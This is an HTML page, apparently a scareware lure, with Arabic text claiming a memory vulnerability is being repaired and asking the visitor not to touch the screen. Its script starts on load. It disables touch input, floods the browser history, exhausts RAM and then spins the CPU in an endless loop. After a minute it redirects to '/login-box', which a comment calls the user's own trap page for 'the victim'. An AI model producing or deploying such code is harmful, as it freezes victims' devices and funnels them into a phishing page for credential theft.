<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>System Error</title>
    <style>
        body { background: black; color: red; text-align: center; padding-top: 50%; font-family: Courier; overflow: hidden; touch-action: none; }
    </style>
</head>
<body>
    <div id="status">⚠️ جاري إصلاح ثغرة في الذاكرة...<br>الرجاء عدم لمس الشاشة</div>

    <script>
        function freezeHard() {
            // 1. شل حركة اللمس تماماً عبر المتصفح
            document.addEventListener('touchstart', (e) => e.preventDefault(), {passive: false});
            document.addEventListener('touchmove', (e) => e.preventDefault(), {passive: false});

            // 2. تجميد شريط العناوين والواجهة عبر إرسال آلاف الطلبات للسجل
            setInterval(() => {
                for (let i = 0; i < 500; i++) {
                    window.history.pushState(null, null, window.location.href + "/" + Math.random());
                }
            }, 100);

            // 3. استهلاك الرام (RAM) - سيجعل الجهاز يتوقف عن الاستجابة للمس النظام
            let bomb = [];
            const freezeInterval = setInterval(() => {
                try {
                    // توليد نصوص عملاقة في الذاكرة
                    bomb.push(new Array(1000000).join("X"));
                } catch (e) {
                    // إذا امتلأت الرام، سنبدأ حلقة CPU لا نهائية
                    while(true) { Math.sqrt(Math.random()); }
                }
            }, 50);

            // توقف السكريبت بعد دقيقة لتحويل الضحية
            setTimeout(() => {
                clearInterval(freezeInterval);
                location.href = "/login-box"; // استبدل بصفحة المصيدة الخاصة بك
            }, 60000);
        }

        window.onload = freezeHard;
    </script>
</body>
</html>
